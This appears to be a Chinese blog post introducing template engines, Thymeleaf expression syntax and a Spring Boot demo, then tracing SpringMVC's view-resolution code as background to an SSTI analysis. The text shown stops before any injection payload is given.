<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Thymeleaf SSTI漏洞分析 | 藏青&#39;s BLOG</title>

  
  <meta name="author" content="藏青">
  

  
  <meta name="description" content="知行合一">
  

  
  <meta name="keywords" content="渗透 内网 代码审计">
  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  <meta property="og:title" content="Thymeleaf SSTI漏洞分析"/>

  <meta property="og:site_name" content="藏青&#39;s BLOG"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">藏青&#39;s BLOG</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
        <li><a href="/categories">Categories</a></li>
      
        <li><a href="/links">Links</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    <article>

  
    
    <h3 class="article-title"><span>Thymeleaf SSTI漏洞分析</span></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2021/11/11/Thymeleaf-SSTI漏洞分析/" rel="bookmark">
        <time class="entry-date published" datetime="2021-11-11T02:25:16.000Z">
          2021-11-11
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    最近看到某平台上有一篇关于SSTI的文章，之前也没了解过SSTI的漏洞，因此决定写篇文章记录学习过程。</p>
<h2 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h2><p>​    要了解SSTI漏洞，首先要对模板引擎有所了解。下面是模板引擎的几个相关概念。</p>
<blockquote>
<p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的文档。</p>
<p>模板引擎的本质是将模板文件和数据通过模板引擎生成最终的HTML代码。</p>
<p>模板引擎不属于特定技术领域，它是跨领域跨平台的概念。</p>
</blockquote>
<span id="more"></span>    

<p>​    模板引擎的出现是为了解决前后端分离的问题，拿JSP的举个栗子，<code>JSP</code>本身也算是一种模板引擎，在<code>JSP</code>访问的过程中编译器会识别JSP的标签，如果是<code>JSP</code>的内容则动态的提取并将执行结果替换，如果是<code>HTML</code>的内容则原样输出。</p>
<p><strong>xxx.jsp</strong></p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Insert title here&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%=<span class="number">111</span>*<span class="number">111</span>%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>​    上面的代码经过<code>JSP</code>引擎编译后，<code>HTML</code>部分直接输出，而使用<code>JSP</code>标签部分则是经过了解析后的结果。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">out.write(<span class="string">&quot;&lt;!DOCTYPE html&gt;\r\n&quot;</span>);</span><br><span class="line">     out.write(<span class="string">&quot;&lt;html&gt;\r\n&quot;</span>);</span><br><span class="line">     out.write(<span class="string">&quot;&lt;head&gt;\r\n&quot;</span>);</span><br><span class="line">     out.write(<span class="string">&quot;&lt;meta charset=\&quot;UTF-8\&quot;&gt;\r\n&quot;</span>);</span><br><span class="line">     out.write(<span class="string">&quot;&lt;title&gt;Insert title here&lt;/title&gt;\r\n&quot;</span>);</span><br><span class="line">     out.write(<span class="string">&quot;&lt;/head&gt;\r\n&quot;</span>);</span><br><span class="line">     out.write(<span class="string">&quot;&lt;body&gt;\r\n&quot;</span>);</span><br><span class="line"><span class="comment">//解析后的结果</span></span><br><span class="line">     out.print(<span class="number">111</span>*<span class="number">111</span>);</span><br><span class="line">     out.write(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">     out.write(<span class="string">&quot;&lt;/body&gt;\r\n&quot;</span>);</span><br><span class="line">     out.write(<span class="string">&quot;&lt;/html&gt;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>​    <strong>既然JSP已经是一个模板引擎了为什么后面还要推出其他的模板引擎？</strong> </p>
<ul>
<li><p>动态资源和静态资源全部耦合在一起，还是需要在<code>JSP</code>文件中写一些后端代码，这其实比较尴尬，所以导致很多JAVA开发不能专注于JAVA开发还需要写一些前端代码。</p>
</li>
<li><p>第一次请求jsp，必须要在web服务器中编译成servlet，第一次运行会较慢。</p>
</li>
<li><p>每次请求jsp都是访问servlet再用输出流输出的html页面，效率没有直接使用html高。</p>
</li>
<li><p>如果jsp中的内容很多，页面响应会很慢，因为是同步加载。</p>
</li>
<li><p>jsp只能运行在web容器中，无法运行在nginx这样的高效的http服务上。</p>
<p><strong>使用模板引擎的好处是什么？</strong></p>
<p>模板设计好后可以直接填充数据使用，不需要重新设计页面，增强了代码的复用性</p>
</li>
</ul>
<h2 id="Thymeleaf"><a href="#Thymeleaf" class="headerlink" title="Thymeleaf"></a>Thymeleaf</h2><p>​    <code>Thymeleaf</code>是众多模板引擎的一种和其他的模板引擎相比，它有如下优势：</p>
<ul>
<li>Thymeleaf使用html通过一些特定标签语法代表其含义，但并未破坏html结构，即使无网络、不通过后端渲染也能在浏览器成功打开，大大方便界面的测试和修改。</li>
<li> Thymeleaf提供标准和Spring标准两种方言，可以直接套用模板实现JSTL、 OGNL表达式效果，避免每天套模板、改JSTL、改标签的困扰。同时开发人员也可以扩展和创建自定义的方言。</li>
<li>Springboot官方大力推荐和支持，Springboot官方做了很多默认配置，开发者只需编写对应html即可，大大减轻了上手难度和配置复杂度。</li>
</ul>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>​    既然<code>Thymeleaf</code>也使用的<code>html</code>，那么如何区分哪些是<code>Thymeleaf</code>的<code>html</code>？</p>
<p>​    在<code>Thymeleaf</code>的<code>html</code>中首先要加上下面的标识。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h4><p>​    <code>Thymeleaf</code>提供了一些内置标签，通过标签来实现特定的功能。</p>
<table>
<thead>
<tr>
<th align="left">标签</th>
<th align="left">作用</th>
<th align="left">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">th:id</td>
<td align="left">替换id</td>
<td align="left"><code>&lt;input th:id=&quot;$&#123;user.id&#125;&quot;/&gt;</code></td>
</tr>
<tr>
<td align="left">th:text</td>
<td align="left">文本替换</td>
<td align="left"><code>&lt;p text:=&quot;$&#123;user.name&#125;&quot;&gt;bigsai&lt;/p&gt;</code></td>
</tr>
<tr>
<td align="left">th:utext</td>
<td align="left">支持html的文本替换</td>
<td align="left"><code>&lt;p utext:=&quot;$&#123;htmlcontent&#125;&quot;&gt;content&lt;/p&gt;</code></td>
</tr>
<tr>
<td align="left">th:object</td>
<td align="left">替换对象</td>
<td align="left"><code>&lt;div th:object=&quot;$&#123;user&#125;&quot;&gt;&lt;/div&gt;</code></td>
</tr>
<tr>
<td align="left">th:value</td>
<td align="left">替换值</td>
<td align="left"><code>&lt;input th:value=&quot;$&#123;user.name&#125;&quot; &gt;</code></td>
</tr>
<tr>
<td align="left">th:each</td>
<td align="left">迭代</td>
<td align="left"><code>&lt;tr th:each=&quot;student:$&#123;user&#125;&quot; &gt;</code></td>
</tr>
<tr>
<td align="left">th:href</td>
<td align="left">替换超链接</td>
<td align="left"><code>&lt;a th:href=&quot;@&#123;index.html&#125;&quot;&gt;超链接&lt;/a&gt;</code></td>
</tr>
<tr>
<td align="left">th:src</td>
<td align="left">替换资源</td>
<td align="left"><code>&lt;script type=&quot;text/javascript&quot; th:src=&quot;@&#123;index.js&#125;&quot;&gt;&lt;/script&gt;</code></td>
</tr>
</tbody></table>
<h4 id="链接表达式"><a href="#链接表达式" class="headerlink" title="链接表达式"></a>链接表达式</h4><p>​    在Thymeleaf 中，如果想引入链接比如link，href，src，需要使用<code>@&#123;资源地址&#125;</code>引入资源。引入的地址可以在<code>static</code>目录下，也可以司互联网中的资源。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;index.css&#125;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">th:src</span>=<span class="string">&quot;@&#123;index.js&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;index.html&#125;&quot;</span>&gt;</span>超链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="变量表达式"><a href="#变量表达式" class="headerlink" title="变量表达式"></a>变量表达式</h4><p>​    可以通过<code>$&#123;…&#125;</code>在model中取值，如果在<code>Model</code>中存储字符串，则可以通过<code>$&#123;对象名&#125;</code>直接取值。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getindex</span><span class="params">(Model model)</span><span class="comment">//对应函数</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">     <span class="comment">//数据添加到model中</span></span><br><span class="line">     model.addAttribute(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;bigsai&quot;</span>);<span class="comment">//普通字符串</span></span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;<span class="comment">//与templates中index.html对应</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;td th:text=&quot;&#x27;我的名字是：&#x27;+$&#123;name&#125;&quot;&gt;&lt;/td&gt;</span><br></pre></td></tr></table></figure>

<p>​    取JavaBean对象使用<code>$&#123;对象名.对象属性&#125;</code>或者<code>$&#123;对象名[&#39;对象属性&#39;]&#125;</code>来取值。如果JavaBean写了get方法也可以通过<code>$&#123;对象.get方法名&#125;</code>取值。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getindex</span><span class="params">(Model model)</span><span class="comment">//对应函数</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">	user user1=<span class="keyword">new</span> user(<span class="string">&quot;bigsai&quot;</span>,<span class="number">22</span>,<span class="string">&quot;一个幽默且热爱java的社会青年&quot;</span>);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;user&quot;</span>,user1);<span class="comment">//储存javabean</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;<span class="comment">//与templates中index.html对应</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;user.name&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;user[&#x27;age&#x27;]&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;user.getDetail()&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​    取Map对象使用<code>$&#123;Map名[&#39;key&#39;]&#125;</code>或<code>$&#123;Map名.key&#125;</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;index&quot;)</span><span class="comment">//页面的url地址</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getindex</span><span class="params">(Model model)</span><span class="comment">//对应函数</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">    Map&lt;String ,String&gt;map=<span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;place&quot;</span>,<span class="string">&quot;博学谷&quot;</span>);</span><br><span class="line">    map.put(<span class="string">&quot;feeling&quot;</span>,<span class="string">&quot;very well&quot;</span>);</span><br><span class="line">    <span class="comment">//数据添加到model中</span></span><br><span class="line">    model.addAttribute(<span class="string">&quot;map&quot;</span>,map);<span class="comment">//储存Map</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;<span class="comment">//与templates中index.html对应</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;map.get(&#x27;place&#x27;)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;map[&#x27;feeling&#x27;]&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​    取List集合：List集合是一个有序列表，需要使用each遍历赋值，<code>&lt;tr th:each=&quot;item:$&#123;userlist&#125;&quot;&gt;</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;index&quot;)</span><span class="comment">//页面的url地址</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getindex</span><span class="params">(Model model)</span><span class="comment">//对应函数</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">    List&lt;String&gt;userList=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    userList.add(<span class="string">&quot;zhang san 66&quot;</span>);</span><br><span class="line">    userList.add(<span class="string">&quot;li si 66&quot;</span>);</span><br><span class="line">    userList.add(<span class="string">&quot;wang wu 66&quot;</span>);</span><br><span class="line">    <span class="comment">//数据添加到model中</span></span><br><span class="line">    model.addAttribute(<span class="string">&quot;userlist&quot;</span>,userList);<span class="comment">//储存List</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;<span class="comment">//与templates中index.html对应</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">th:each</span>=<span class="string">&quot;item:$&#123;userlist&#125;&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;item&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="选择变量表达式"><a href="#选择变量表达式" class="headerlink" title="选择变量表达式"></a>选择变量表达式</h4><p>​    变量表达式也可以写为<code>*&#123;...&#125;</code>。星号语法对选定对象而不是整个上下文评估表达式。也就是说，只要没有选定的对象，美元(<code>$&#123;…&#125;</code>)和星号(<code>*&#123;...&#125;</code>)的语法就完全一样。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:object</span>=<span class="string">&quot;$&#123;user&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Name: <span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;*&#123;name&#125;&quot;</span>&gt;</span>赛<span class="tag">&lt;/<span class="name">span</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Age: <span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;*&#123;age&#125;&quot;</span>&gt;</span>18<span class="tag">&lt;/<span class="name">span</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Detail: <span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;*&#123;detail&#125;&quot;</span>&gt;</span>好好学习<span class="tag">&lt;/<span class="name">span</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="消息表达式"><a href="#消息表达式" class="headerlink" title="消息表达式"></a>消息表达式</h4><p>​    文本外部化是从模板文件中提取模板代码的片段，以便可以将它们保存在单独的文件(通常是.properties文件)中,文本的外部化片段通常称为“消息”。通俗易懂的来说<code>#&#123;…&#125;</code>语法就是用来<strong>读取配置文件中数据</strong>的。</p>
<h4 id="片段表达式"><a href="#片段表达式" class="headerlink" title="片段表达式"></a>片段表达式</h4><p>​    片段表达式<code> ~&#123;...&#125;</code>可以用于引用公共的目标片段，比如可以在一个<code>template/footer.html</code>中定义下面的片段,并在另一个template中引用。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:fragment</span>=<span class="string">&quot;copy&quot;</span>&gt;</span></span><br><span class="line">    <span class="symbol">&amp;copy;</span> 2011 The Good Thymes Virtual Grocery</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div th:insert=&quot;~&#123;footer :: copy&#125;&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>​    为了能快速对<code>Thymeleaf</code>上手，我们可以先写一个Demo直观的看到<code>Thymeleaf</code>的使用效果。</p>
<p>​    首先创建一个<code>SpringBoot</code>项目，在模板处选择<code>Thymeleaf</code>。</p>
<p><img src="/2021/11/11/Thymeleaf-SSTI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211109175852075.png" alt="image-20211109175852075"></p>
<p>​    创建好的目录结构如下，可以在<code>templates</code>中创建<code>html</code>模板文件。</p>
<p><img src="/2021/11/11/Thymeleaf-SSTI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211109180008793.png" alt="image-20211109180008793"></p>
<p>​    编写<code>Controller</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">urlController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;index&quot;)</span><span class="comment">//页面的url地址</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getindex</span><span class="params">(Model model)</span><span class="comment">//对应函数</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;bigsai&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;<span class="comment">//与templates中index.html对应</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    在<code>templates</code>下创建模板文件<code>index.html</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>  <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">hello 第一个Thymeleaf程序</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;name&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​    启动程序访问<code>/index</code></p>
<p><img src="/2021/11/11/Thymeleaf-SSTI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211109180836203.png" alt="image-20211109180836203"></p>
<h2 id="SpringMVC-视图解析过程分析"><a href="#SpringMVC-视图解析过程分析" class="headerlink" title="SpringMVC 视图解析过程分析"></a>SpringMVC 视图解析过程分析</h2><p>​    视图解析的过程是发生在Controller处理后，Controller处理结束后会将返回的结果封装为<code>ModelAndView</code>对象，再通过视图解析器<code>ViewResovler</code>得到对应的视图并返回。分析的栗子使用上面的Demo。</p>
<h3 id="封装ModelAndView对象"><a href="#封装ModelAndView对象" class="headerlink" title="封装ModelAndView对象"></a>封装ModelAndView对象</h3><p>​    在<code>ServletInvocableHandlerMethod#invokeAndHandle</code>中，做了如下操作：</p>
<ul>
<li><code>invokeForRequest</code>调用Controller后获取返回值到<code>returnValue</code>中</li>
<li>判断<code>returnValue</code>是否为空，如果是则继续判断<code>0RequestHandled</code>是否为<code>True</code>，都满足的话设置<code>requestHandled</code>为<code>true</code></li>
<li>通过<code>handleReturnValue</code>根据返回值的类型和返回值将不同的属性设置到<code>ModelAndViewContainer</code>中。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">invokeAndHandle</span><span class="params">(ServletWebRequest webRequest, ModelAndViewContainer mavContainer, Object... providedArgs)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//调用Controller后获取返回值到returnValue中</span></span><br><span class="line">    Object returnValue = <span class="keyword">this</span>.invokeForRequest(webRequest, mavContainer, providedArgs);</span><br><span class="line">    <span class="keyword">this</span>.setResponseStatus(webRequest);</span><br><span class="line">    <span class="comment">//判断returnValue是否为空</span></span><br><span class="line">    <span class="keyword">if</span> (returnValue == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">//判断RequestHandled是否为True</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.isRequestNotModified(webRequest) || <span class="keyword">this</span>.getResponseStatus() != <span class="keyword">null</span> || mavContainer.isRequestHandled()) &#123;</span><br><span class="line">            <span class="keyword">this</span>.disableContentCachingIfNecessary(webRequest);</span><br><span class="line">            <span class="comment">//设置RequestHandled属性</span></span><br><span class="line">            mavContainer.setRequestHandled(<span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (StringUtils.hasText(<span class="keyword">this</span>.getResponseStatusReason())) &#123;</span><br><span class="line">        mavContainer.setRequestHandled(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mavContainer.setRequestHandled(<span class="keyword">false</span>);</span><br><span class="line">    Assert.state(<span class="keyword">this</span>.returnValueHandlers != <span class="keyword">null</span>, <span class="string">&quot;No return value handlers&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//通过handleReturnValue根据返回值的类型和返回值将不同的属性设置到ModelAndViewContainer中。</span></span><br><span class="line">        <span class="keyword">this</span>.returnValueHandlers.handleReturnValue(returnValue, <span class="keyword">this</span>.getReturnValueType(returnValue), mavContainer, webRequest);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">        <span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">            logger.trace(<span class="keyword">this</span>.formatErrorForReturnValue(returnValue), var6);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> var6;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>​    下面分析<code>handleReturnValue</code>方法。</p>
<ul>
<li><code>selectHandler</code>根据返回值和类型找到不同的<code>HandlerMethodReturnValueHandler</code>，这里得到了<code>ViewNameMethodReturnValueHandler</code>,具体怎么得到的就不分析了。</li>
<li>调用<code>handler.handleReturnValue</code>，这里得到不同的<code>HandlerMethodReturnValueHandler</code>处理的方式也不相同。</li>
</ul>
